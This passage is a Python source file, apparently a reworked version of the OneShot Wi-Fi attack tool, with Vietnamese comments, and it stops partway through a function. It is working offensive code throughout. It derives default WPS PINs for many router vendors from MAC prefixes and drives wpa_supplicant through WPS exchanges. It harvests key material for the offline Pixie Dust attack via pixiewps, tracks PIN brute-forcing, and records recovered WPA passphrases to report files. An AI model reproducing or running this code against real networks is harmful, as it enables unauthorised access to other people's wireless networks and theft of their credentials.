#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict, Optional

""" đây là code pixie Dust Được Tái Tại lại"""
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError(' Bạn Đưa Bùi Gì Vào Vậy MAC Kia Mà.....😅')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """PIN Các Routor Lỏ"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            for mask in masks:
                if mac.startswith(mask):
                    res.append(algo_id)
                    break
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        return '[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time)

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            return self.display_status()
        return None

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.messages = []  # Store all output messages

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def _log(self, msg):
        """Store message for later return"""
        self.messages.append(msg)
        if self.print_debug:
            sys.stderr.write(msg + '\n')

    def __init_wpa_supplicant(self):
        self._log('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self._log('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self._log('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    self._log('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self._log('[*] Received WSC NACK')
                self._log('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    self._log('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    self._log('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    self._log('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    self._log('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    self._log('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    self._log('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self._log('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            self._log('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self._log('[*] Authenticating…')
        elif 'Authentication response' in line:
            self._log('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self._log('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self._log('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self._log('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self._log('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self._log('[*] Received Identity Request')
        elif 'using real identity' in line:
            self._log('[*] Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            self._log('[*] Selected AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        self._log("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            self._log(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
        if r.stdout:
            self._log(r.stdout)
        if r.stderr:
            self._log(r.stderr)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        self._log(f"[+] WPS PIN: '{wps_pin}'")
        self._log(f"[+] WPA PSK: '{wpa_psk}'")
        self._log(f"[+] AP SSID: '{essid}'")
        return {'wps_pin': wps_pin, 'wpa_psk': wpa_psk, 'essid': essid}

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        self._log(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        self._log('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            self._log(f'PINs generated for {bssid}:')
            self._log('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                self._log(line)
            # For non-interactive mode, return first PIN
            return pins[0]['pin']
        elif len(pins) == 1:
            pin = pins[0]
            self._log('[i] The only probable PIN is selected: {}'.format(pin['name']))
            return pin['pin']
        else:
            return None

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        # Clean the pipe
        for _ in range(300):
            self.wpas.stdout.read(1)
        if pbc_mode:
            if bssid:
                self._log(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                self._log("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            self._log(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            self._log(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return self.connection_status.status == 'GOT_PSK'

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        self._log(f'[?] Using previously calculated PIN {t_pin}')
                        pin = t_pin
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, get a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                success = self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                self._log("\nAborting…")
                self.__savePin(bssid, pin)
                return {'success': False, 'error': 'Aborted', 'messages': self.messages}
        else:
            success = self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            creds = self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return {
                'success': True,
